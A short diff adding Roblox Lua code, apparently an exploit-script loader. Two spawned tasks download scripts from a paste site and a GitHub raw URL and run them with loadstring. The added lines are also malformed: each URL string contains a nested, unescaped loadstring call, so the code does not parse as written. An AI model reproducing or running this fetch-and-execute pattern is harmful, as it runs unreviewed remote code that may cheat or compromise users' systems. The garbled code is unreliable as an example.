@@ -1,0 +1,7 @@
+task.spawn(function()
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://cdn.sourceb.in/bins/hUqSII2mGl/0"))()"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/x100.lua"))()"))()
+end)
